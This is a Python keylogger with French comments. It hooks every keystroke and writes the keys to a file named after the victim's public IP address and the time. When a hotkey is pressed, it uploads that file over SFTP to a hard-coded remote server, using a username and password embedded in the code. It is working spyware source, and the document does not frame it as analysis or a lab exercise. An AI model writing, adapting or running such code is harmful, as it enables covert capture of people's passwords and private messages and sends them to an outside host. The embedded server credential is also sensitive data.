import time
import keyboard
from unidecode import unidecode
import requests
import datetime
import paramiko

class Fichier:
    
    """
    Classe pour enregistrer les frappes du clavier et stocker les données dans un fichier.
    """

    def __init__(self):
        """
        Initialise les attributs nom_fichier et majuscule_active.

        Retourne :
            Aucune valeur de retour
        """
        self.majuscule_active = False
        self.nom_fichier = ""

    def get_ip(self):
        """
        Récupère l'adresse IP de l'utilisateur en utilisant une requête HTTP.

        Retourne:
            str: L'adresse IP de l'utilisateur si la requête réussit, sinon None.
        """
        try:
            response = requests.get('https://httpbin.org/ip')
            if response.status_code == 200:
                ip_address = response.json().get('origin')
                return ip_address
            else:
                return None
        except Exception as e:
            return None

    def get_keyboard(self, e):
        """
        Enregistre les touches du clavier dans un fichier unique basé sur l'adresse IP de l'utilisateur
        la date et l'heure.

        Arguments:
            e (keyboard.KeyboardEvent): L'événement du clavier déclenché.

        """
        if not self.nom_fichier:
            ip_personne = self.get_ip() or "unknown"
            self.nom_fichier = f"{ip_personne}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"

        liste_mots = []
        if e.event_type == keyboard.KEY_DOWN:
            if e.name == "space":
                liste_mots.append(" ")
            elif e.name == "backspace" or e.name == "delete" or e.name == "suppr":
                if liste_mots:
                    liste_mots.pop()
            elif e.name == "enter":
                liste_mots.append("\n")
            elif e.name == "tab":
                liste_mots.append("\t")
            elif e.name == "esc":
                liste_mots.append("")
            elif e.name == "ctrl":
                liste_mots.append(" ctrl+")
            elif e.name == "haut":
                liste_mots.append("↑")
            elif e.name == "bas":
                liste_mots.append("↓")
            elif e.name == "droite":
                liste_mots.append("→")
            elif e.name == "gauche":
                liste_mots.append("←")
            elif e.name == "verr.maj" or e.name == "maj":
                liste_mots.append("")
            else:
                liste_mots.append(unidecode(e.name))

        with open(self.nom_fichier, "a", encoding='utf-8') as fichier:
            for mots in liste_mots:
                fichier.write(mots)

    def send_to_server(self):
        """
        Envoie le(s) fichier(s) self.nom_fichier vers un serveur distant en utilisant SSH.

        Cette fonction se connecte au serveur distant à l'adresse IP 162.19.227.91 en utilisant
        le protocole SSH (port 22) avec un nom d'utilisateur et un mot de passe fourni.
        Elle transfère ensuite le fichier vers le répertoire 'Fichier/' sur le serveur distant.

        Retourne: 
            Aucune valeur si réussi, ou un message d'exception en cas d'erreurs d'authentification
        ou d'autres exceptions.
        """

        if not self.nom_fichier:
            return

        ssh_host = "162.19.227.91"
        ssh_port = 22
        ssh_username = "yamyna"
        ssh_password = "7Hb*#kRz9Q!p"

        try:
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ssh_host, ssh_port, ssh_username, ssh_password)

            with ssh.open_sftp() as sftp:
                sftp.put(self.nom_fichier, f"Fichier/{self.nom_fichier}")

        except paramiko.AuthenticationException as auth_error:
            return {auth_error}
        except Exception as e:
            return {e}

        finally:
            ssh.close()

    def start_keyboard(self):
        """
        Démarre la surveillance du clavier.
        Pour arrêter le programme tapez : 'Ctrl+Alt+G' comme raccourci.
        Une limite de temps est défini à 10 minutes (600 secondes) pour 
        arrêter le programme automatiquement. 

        Retourne: 
            Aucune valeur de retour, la fonction s'exécute jusqu'à ce que la limite de temps
        soit atteinte ou qu'une exception KeyboardInterrupt soit levée.
        """
        
        custom_combination = 'ctrl+alt+g'
        keyboard.hook(self.get_keyboard)
        keyboard.add_hotkey(custom_combination, self.stop_program)
        time_limit = 10 * 60
        start_time = time.time()

        try:
            while time.time() - start_time < time_limit:
                time.sleep(1)
        except KeyboardInterrupt:
            pass  

    def stop_program(self):
        """
        Arrête le programme en appelant self.send_to_server() pour envoyer des données au serveur
        avant de quitter le programme.

        Retourne: 
            Aucune valeur de retour, la fonction termine le programme après l'envoi des données.
        """
        self.send_to_server()
        exit()

if __name__ == "__main__":
    fichier = Fichier()
    fichier.start_keyboard()
